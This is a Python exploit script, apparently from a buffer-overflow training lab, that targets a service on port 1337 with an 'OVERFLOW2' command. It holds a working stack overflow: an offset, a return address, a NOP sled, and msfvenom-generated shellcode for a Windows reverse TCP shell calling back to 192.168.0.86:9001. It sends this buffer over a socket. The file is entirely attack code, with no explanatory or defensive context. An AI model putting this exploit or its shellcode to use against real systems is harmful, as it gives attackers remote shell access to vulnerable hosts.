#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xBB\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 16

# Badchars: \x00\x23\x3c\x83\xba
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c
payload = (
"\xfc\xbb\xfb\x73\x45\xdb\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x07\x9b\xc7"
"\xdb\xf7\x5c\xa8\x52\x12\x6d\xe8\x01\x57\xde\xd8\x42\x35"
"\xd3\x93\x07\xad\x60\xd1\x8f\xc2\xc1\x5c\xf6\xed\xd2\xcd"
"\xca\x6c\x51\x0c\x1f\x4e\x68\xdf\x52\x8f\xad\x02\x9e\xdd"
"\x66\x48\x0d\xf1\x03\x04\x8e\x7a\x5f\x88\x96\x9f\x28\xab"
"\xb7\x0e\x22\xf2\x17\xb1\xe7\x8e\x11\xa9\xe4\xab\xe8\x42"
"\xde\x40\xeb\x82\x2e\xa8\x40\xeb\x9e\x5b\x98\x2c\x18\x84"
"\xef\x44\x5a\x39\xe8\x93\x20\xe5\x7d\x07\x82\x6e\x25\xe3"
"\x32\xa2\xb0\x60\x38\x0f\xb6\x2e\x5d\x8e\x1b\x45\x59\x1b"
"\x9a\x89\xeb\x5f\xb9\x0d\xb7\x04\xa0\x14\x1d\xea\xdd\x46"
"\xfe\x53\x78\x0d\x13\x87\xf1\x4c\x7c\x64\x38\x6e\x7c\xe2"
"\x4b\x1d\x4e\xad\xe7\x89\xe2\x26\x2e\x4e\x04\x1d\x96\xc0"
"\xfb\x9e\xe7\xc9\x3f\xca\xb7\x61\xe9\x73\x5c\x71\x16\xa6"
"\xf3\x21\xb8\x19\xb4\x91\x78\xca\x5c\xfb\x76\x35\x7c\x04"
"\x5d\x5e\x17\xff\x36\xa1\x40\xff\x90\x49\x93\xff\x3f\xa3"
"\x1a\x19\x55\xa3\x4a\xb2\xc2\x5a\xd7\x48\x72\xa2\xcd\x35"
"\xb4\x28\xe2\xca\x7b\xd9\x8f\xd8\xec\x29\xda\x82\xbb\x36"
"\xf0\xaa\x20\xa4\x9f\x2a\x2e\xd5\x37\x7d\x67\x2b\x4e\xeb"
"\x95\x12\xf8\x09\x64\xc2\xc3\x89\xb3\x37\xcd\x10\x31\x03"
"\xe9\x02\x8f\x8c\xb5\x76\x5f\xdb\x63\x20\x19\xb5\xc5\x9a"
"\xf3\x6a\x8c\x4a\x85\x40\x0f\x0c\x8a\x8c\xf9\xf0\x3b\x79"
"\xbc\x0f\xf3\xed\x48\x68\xe9\x8d\xb7\xa3\xa9\xae\x55\x61"
"\xc4\x46\xc0\xe0\x65\x0b\xf3\xdf\xaa\x32\x70\xd5\x52\xc1"
"\x68\x9c\x57\x8d\x2e\x4d\x2a\x9e\xda\x71\x99\x9f\xce\x71"
"\x1d\x60\xf1"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")